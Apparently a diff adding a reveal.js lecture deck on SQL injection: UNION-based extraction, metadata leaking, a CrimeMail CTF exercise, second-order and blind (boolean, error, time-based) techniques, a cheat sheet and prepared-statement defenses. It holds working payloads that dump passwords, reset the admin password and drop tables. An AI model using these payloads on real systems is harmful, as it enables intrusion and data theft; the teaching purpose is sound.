+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+**Technique 2**: `UNION SELECT` with increasing `NULL` values:
+```
+' UNION SELECT NULL -- -          (ERROR)
+' UNION SELECT NULL, NULL -- -    (OK ➜ 2 columns)
+```
+
+</div>
+
+
+
+</div>
+
+---
+
+## Finding Displayable Columns
+
+<div class="content-center">
+
+Not all columns may be **displayed on the page** (some might be used internally). We need to find which columns are shown.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Once we know the number of columns (e.g., 3), we test each position with a **recognizable value**:
+
+```
+' UNION SELECT 'aaa', NULL, NULL -- -
+' UNION SELECT NULL, 'bbb', NULL -- -
+' UNION SELECT NULL, NULL, 'ccc' -- -
+```
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+If `'bbb'` appears on the page, we know **column 2 is displayed** ➜ we can use that column to extract data:
+
+```
+' UNION SELECT NULL, password, NULL FROM users -- -
+```
+
+</div>
+
+
+
+</div>
+
+---
+
+## Leaking Database Metadata
+
+<div class="content-center">
+
+When the source code is **not available**, how can we discover the names of tables and columns?
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+We can use the SQL injection to leak the **database metadata** (information about tables, columns, etc.), which is stored in special **system tables**!
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+| DBMS | Table Names | Column Names |
+|------|-------------|-------------|
+| **MySQL/PostgreSQL** | `information_schema.tables` | `information_schema.columns` |
+| **SQLite** | `sqlite_master` | `PRAGMA table_info(table_name)` |
+| **Oracle** | `all_tables` | `all_tab_columns` |
+| **MS SQL** | `information_schema.tables` | `information_schema.columns` |
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+Example (MySQL):
+```sql
+' UNION SELECT TABLE_NAME, COLUMN_NAME
+  FROM INFORMATION_SCHEMA.COLUMNS #
+```
+
+</div>
+
+
+
+</div>
+
+---
+
+## UNION-Based SQLi: Summary of Steps
+
+<div class="content-center">
+
+The typical workflow for a UNION-based SQL injection attack:
+
+1. **Confirm the vulnerability**: inject `'` and observe errors or behavior changes
+2. **Determine column count**: use `ORDER BY` or `UNION SELECT NULL` technique
+3. **Find displayable columns**: inject recognizable values in each position
+4. **Leak metadata**: extract table and column names from system tables
+5. **Extract data**: use `UNION SELECT` to dump the target table
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+<div class="alert alert-note"><b>NOTE</b>: Automated tools like <b>sqlmap</b> can perform all these steps automatically!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# CrimeMail
+
+---
+
+## CrimeMail - Description
+
+<div class="content-center">
+
+Collins Hackle is a notorious bad guy, and you've decided to take him down. You need something on him, anything, to send the police his way, and it seems he uses **CrimeMail**, a very specialized email service, to communicate with his associates.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Let's see if you can hack your way into his account...
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-hint"><b>HINT</b>: <code>hash = md5(password + salt)</code> and Collins Hackle has a password which can be found in an English dictionary.</div>
+
+<br/>
+
+
+</div>
+
+
+
+</div>
+
+<div class="footnotes">
+
+<sup>*</sup> **Credits**: INS'hAck 2018<br>
+
+</div>
+
+---
+
+## CrimeMail - Reconnaissance
+
+<div class="content-center">
+
+The application is based on **PHP** and there is likely a database of users. A very common DB in PHP+Linux is **MySQL**.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+There are two forms that take inputs from the users: a **login page** (`/`) and a **forgot password page** (`/forgot.php`).
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="cell-center">
+
+**What can go wrong?**
+
+</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## CrimeMail - Hypothesis
+
+<div class="content-center">
+
+If we insert a `'` in `/forgot.php` we get:
+
+<br/>
+
+
+```
+Database error: You have an error in your SQL syntax;
+check the manual that corresponds to your MySQL server
+version for the right syntax to use near ''''' at line 1
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+This is a strong indication that the user input is **not sanitized correctly** and is vulnerable to SQL injection!
+
+</div>
+
+
+
+</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# Second-Order SQL Injection
+
+---
+
+## Second-Order SQL Injection in a Nutshell
+
+<div class="content-center">
+
+In the attacks seen so far, the payload is executed **immediately** when the user input reaches the database.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+But some applications validate inputs coming from the **user**, but **not data coming from the database**, which is considered more trusted.
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+In **Second-Order SQL injections** (also known as **Stored SQL injections**), the payload is **first stored** in the database and then **used later** to perform the attack.
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+Two phases:
+1. **Storage**: The attacker submits a malicious payload that is safely stored in the database (e.g., during registration)
+2. **Trigger**: The stored data is later retrieved and unsafely embedded in a new SQL query
+
+</div>
+
+
+
+</div>
+
+---
+
+## Second-Order SQLi: Step 1 (Storage)
+
+<div class="content-center">
+
+The attacker registers a new account using the following malicious **username**:
+
+<br/>
+
+
+```
+'; UPDATE users SET password='newpwd' WHERE user='admin' -- -
+```
+
+<div class="fragment" data-fragment-index="0">
+
+The registration form uses **prepared statements** (safe!), so the username is stored **as-is** in the database without causing harm... yet.
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+| user | password | age |
+|------|----------|-----|
+| admin | 1f4sdge! | 37 |
+| mauro | mkfln34. | 30 |
+| `'; UPDATE users SET password='newpwd' WHERE user='admin' -- -` | attacker123 | 99 |
+
+</div>
+
+
+
+</div>
+
+---
+
+## Second-Order SQLi: Step 2 (Trigger)
+
+<div class="content-center">
+
+The attacker logs in. The server reads the username from the database and stores it in `$_SESSION["user"]`.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Later, the search page (seen earlier) uses the **session username** in a query **without sanitization**:
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+```php
+// $_SESSION["user"] now contains the malicious username from the DB!
+$query = "SELECT sender, content FROM messages WHERE
+         receiver='" . $_SESSION["user"] . "' AND
+         content LIKE '%" . $_GET["search"] . "%'";
+```
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+The resulting query:
+```sql
+SELECT * FROM messages WHERE receiver = '';
+UPDATE users SET password='newpwd' WHERE user='admin'
+-- -' AND content LIKE '%%'
+```
+
+</div>
+
+<div class="fragment" data-fragment-index="3">
+
+<div class="alert alert-warning"><b>RESULT</b>: The admin password is changed even though the input was "safely" stored during registration!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Why Second-Order SQLi Is Dangerous
+
+<div class="content-center">
+
+Second-order SQLi is particularly dangerous because:
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+- The **storage** step may be perfectly safe (using prepared statements)
+- The **trigger** happens in a **completely different part** of the application
+- Developers often **trust data from the database** because they assume it was already validated
+- It is **harder to detect** because the injection and the exploitation are separated in time and code
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-warning"><b>Lesson</b>: Never trust <b>any</b> data, even if it comes from your own database! Always use parameterized queries.</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# Blind SQL Injection
+
+---
+
+## Blind SQL Injection: The Problem
+
+<div class="content-center">
+
+So far, we assumed the application **shows the query results** on the page (UNION-based) or **allows stacked queries**.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+But what if the application is **vulnerable to SQL injection**, but its HTTP responses **do not contain**:
+- the results of the relevant SQL query, nor
+- the details of any database errors
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+**UNION-based attacks are ineffective!** What can we do instead?
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+Three main techniques:
+1. **Conditional behavior** (Boolean-based)
+2. **Conditional errors** (Error-based)
+3. **Time delays** (Time-based)
+
+</div>
+
+<div class="fragment" data-fragment-index="3">
+
+<div class="alert alert-note">These techniques extract data <b>one bit at a time</b> by asking the database yes/no questions!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Blind SQLi: Boolean-Based (1/2)
+
+<div class="content-center">
+
+Suppose the query is:
+```sql
+SELECT id FROM users WHERE id = $_GET["id"]
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+There is **no way to see** the query result directly. However, the application **reacts differently** depending on whether rows are returned:
+- At least one row ➜ shows **"Welcome back"**
+- No rows ➜ shows **"User not found"**
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+This gives us a **1-bit information channel**: we can ask the database **true/false questions**!
+
+</div>
+
+
+
+</div>
+
+---
+
+## Blind SQLi: Boolean-Based (2/2)
+
+<div class="content-center">
+
+Assuming we know a valid `id` and the admin username, we can inject:
+```sql
+xyz' AND SUBSTRING((SELECT Password FROM Users
+  WHERE Username = 'Administrator'), 1, 1) > 'k
+```
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+`SUBSTRING(string, start, length)` extracts a substring. Here it extracts the **1st character** of the admin password.
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+If **"Welcome back"** is shown ➜ the first character of the password is **greater than 'k'**.
+
+We perform a **binary search** to identify the exact character, then move to the next position.
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+For a password of length `n` with characters from a set of size `c`, this requires approximately **n × log₂(c)** requests (e.g., ~7 requests per character for alphanumeric).
+
+</div>
+
+<div class="fragment" data-fragment-index="3">
+
+<div class="alert alert-note"><b>NOTE</b>: To leak table/column names, we can exploit a similar technique on the database metadata!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Blind SQLi: Error-Based
+
+<div class="content-center">
+
+What if the application doesn't change its visible behavior at all, but returns **different HTTP status codes** for database errors (e.g., 200 vs 500)?
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+We can **conditionally trigger a SQL error** to get our 1-bit channel:
+
+<br/>
+
+
+```sql
+xyz' AND (SELECT CASE
+  WHEN (Username = 'Administrator'
+        AND SUBSTRING(Password, 1, 1) > 'm')
+  THEN 1/0
+  ELSE 'a'
+  END FROM Users)='a
+```
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+- If the condition is **true**: the query evaluates `1/0` ➜ **division by zero error** ➜ HTTP 500
+- If the condition is **false**: the query evaluates `'a'='a'` ➜ **no error** ➜ HTTP 200
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-note">Source: <a href="https://portswigger.net/web-security/sql-injection/blind">PortSwigger - Blind SQL Injection</a></div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Blind SQLi: Time-Based
+
+<div class="content-center">
+
+What if the application **always responds the same way**, regardless of errors? (Same page, same status code.)
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+We can measure the **response time** — introduce a **delay** when a condition is true:
+
+<br/>
+
+
+```sql
+'; IF (SELECT COUNT(Username) FROM Users
+   WHERE Username = 'Administrator'
+   AND SUBSTRING(Password, 1, 1) > 'm') = 1
+   WAITFOR DELAY '0:0:10' --
+```
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+- If the condition is **true**: the response takes **~10 seconds**
+- If the condition is **false**: the response returns **immediately**
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+This is the **last resort** technique — very slow but works even with completely "blind" responses.
+
+</div>
+
+
+
+</div>
+
+---
+
+## Time-Based SQLi: DBMS-Specific Delay Functions
+
+<div class="content-center">
+
+Different database systems have different delay functions:
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+| DBMS | Delay Function | Example |
+|------|---------------|----------|
+| **MySQL** | `SLEEP(seconds)` | `IF(condition, SLEEP(10), 0)` |
+| **PostgreSQL** | `pg_sleep(seconds)` | `SELECT CASE WHEN (cond) THEN pg_sleep(10) END` |
+| **MS SQL** | `WAITFOR DELAY 'hⓂ️s'` | `IF (cond) WAITFOR DELAY '0:0:10'` |
+| **Oracle** | `dbms_pipe.receive_message(...)` | `dbms_pipe.receive_message(('a'),10)` |
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+<div class="alert alert-note"><b>NOTE</b>: Identifying the DBMS is often one of the first steps in an attack. Techniques vary significantly across databases!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+<!-- .slide: data-state="break-blue hide-controls" -->
+
+# SQLi Cheat Sheet & Prevention
+
+---
+
+## SQL Injection Cheat Sheet
+
+<div class="content-center">
+
+A non-exhaustive list of useful tricks for SQL injection:
+
+| Technique | Example |
+|-----------|--------|
+| **Comment out rest of query** | `-- -`, `#`, `/* */` |
+| **String concatenation** | `'foo' \|\| 'bar'` (PostgreSQL), `CONCAT('foo','bar')` (MySQL) |
+| **Always-true condition** | `' OR 1=1 -- -`, `' OR 'a'='a` |
+| **Stacked queries** | `'; DROP TABLE users -- -` |
+| **UNION-based extraction** | `' UNION SELECT NULL, username, password FROM users -- -` |
+| **Determine column count** | `' ORDER BY N -- -` or `' UNION SELECT NULL,...,NULL -- -` |
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Full cheat sheet: [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+Other useful tricks:
+- Check the number of columns for a table: `(SELECT 1, 2, 3, 4) = (SELECT * FROM 'table')` ➜ fatal error when the number of columns doesn't match
+- [SQLite] Leak schema: `SELECT sql FROM sqlite_master WHERE type != 'meta' AND sql NOT NULL AND name = 'table_name';`
+
+</div>
+
+
+
+</div>
+
+---
+
+## Preventing SQL Injections: Prepared Statements
+
+<div class="content-center">
+
+**Use prepared statements** (parameterized queries): they embed untrusted parameters in a query while ensuring its **syntactical structure is preserved**.
+
+<br/>
+
+
+```php
+<?php
+    // Connect to the database
+    $db = new PDO(CONNECTION_STRING, DB_USER, DB_PASS);
+
+    // Define the query with ? placeholders (NOT string concatenation!)
+    $query = "SELECT * FROM users WHERE user = ? AND password = ?";
+
+    // Prepare the query (the DB parses the structure FIRST)
+    $sth = $db->prepare($query);
+
+    // Bind user input to the placeholders (treated as DATA, not code)
+    $sth->bindValue(1, $_POST["user"]);
+    $sth->bindValue(2, $_POST["password"]);
+
+    // Execute the query safely
+    $sth->execute();
+    $user = $sth->fetch();
+    // ...
+?>
+```
+
+
+
+</div>
+
+---
+
+## Why Prepared Statements Work
+
+<div class="content-center">
+
+The `?` placeholders are **bound** to user-supplied values. The database driver ensures that the values are treated as **data**, not as part of the SQL syntax.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+With prepared statements, the database processes the query in **two steps**:
+1. **Parse**: the SQL structure is analyzed (`SELECT ... WHERE user = ? AND password = ?`)
+2. **Bind**: the user values are plugged into the holes as **data only**
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+Even if the attacker provides `admin' -- ` as input, the database treats it as the **literal string** `admin' -- ` and not as SQL code!
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+<div class="alert alert-note">This <b>enforces the boundary</b> between code and data that we discussed earlier — the fundamental fix for the injection problem!</div>
+
+</div>
+
+
+
+</div>
+
+---
+
+## Additional Prevention Measures
+
+<div class="content-center">
+
+Rely on **whitelisting** approaches ONLY when prepared statements **cannot** be used (e.g., when the input is the name of the table to be used in `FROM` or `ORDER BY`):
+- e.g., allow only safe characters like letters, digits, and underscore
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+**Restrict access** to sensitive tables with database permissions (defense-in-depth protection):
+- However, this cannot be done when these tables are required to implement the functionalities of the web application
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="1">
+
+**Apply least privilege** to the database account used by the web application:
+- Don't connect with admin/root privileges
+- Use read-only accounts where possible
+
+<br/>
+
+
+</div>
+
+<div class="fragment" data-fragment-index="2">
+
+**Never expose database errors** to the user: they reveal internal structure and help attackers craft payloads.
+
+</div>
+
+
+
+</div>
+
+---
+
+## Data Leak through SQLi (2020)
+
+<div class="content-center">
+
+In 2020, a hacker **leaked 23 million usernames and passwords** from Webkinz, a children's game, using SQL injection.
+
+<br/>
+
+
+<div class="fragment" data-fragment-index="0">
+
+Details: [ZDNet article](https://www.zdnet.com/article/hacker-leaks-23-million-usernames-and-passwords-from-webkinz-childrens-game/)
+
+</div>
+
+
+
+</div>
+
+---
+
+## Useful Resources
+
+<div class="content-center">
+
+- [Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
+- [Web Security Academy - Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
+- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- **[SQL Injection Payloads](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/)**
+- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
+
+
+
+</div>
+                    </textarea>
+                </section>
+            </div>
+        </div>
+        <script src="../assets/reveal-js/dist/reveal.js"></script>
+        <script src="../assets/reveal-js/plugin/highlight/highlight.js"></script>
+        <script src="../assets/reveal-js/plugin/markdown/markdown.js"></script>
+        <script src="../assets/reveal-js/plugin/math/math.js"></script>
+        <script src="../assets/reveal-js/plugin/notes/notes.js"></script>
+        <script src="../assets/reveal-js/plugin/search/search.js"></script>
+        <script src="../assets/reveal-js/plugin/zoom/zoom.js"></script>
+
+        
+            
+                <script src="../assets/js/custom.js"></script>
+            
+        
+
+        
+            
+                
+                    
+                        <script src="https://cdn.jsdelivr.net/npm/reveal.js-mermaid-plugin/plugin/mermaid/mermaid.min.js"></script>
+                    
+                
+            
+                
+                    
+                        <script src="https://cdn.jsdelivr.net/npm/reveal-plantuml/dist/reveal-plantuml.min.js"></script>
+                    
+                
+            
+        
+
+        <script>
+            Reveal.initialize({
+                
+                    
+                        history: true,
+                    
+                        slideNumber: "c/t",
+                    
+                        height: 1080,
+                    
+                        width: 1920,
+                    
+                        transition: "none",
+                    
+                        backgroundTransition: "none",
+                    
+                        pdfSeparateFragments: false,
+                    
+                
+                plugins: [
+                    RevealMarkdown, // Must come before the other plugins so they can hook into the generated HTML.
+                    RevealHighlight,
+                    RevealMath.KaTeX,
+                    RevealNotes,
+                    RevealSearch,
+                    RevealZoom,
+
+                    
+                        
+                            
+                                RevealMermaid,
+                            
+                        
+                            
+                        
+                    
+                ],
+            });
+        </script>
+    </body>
+</html>
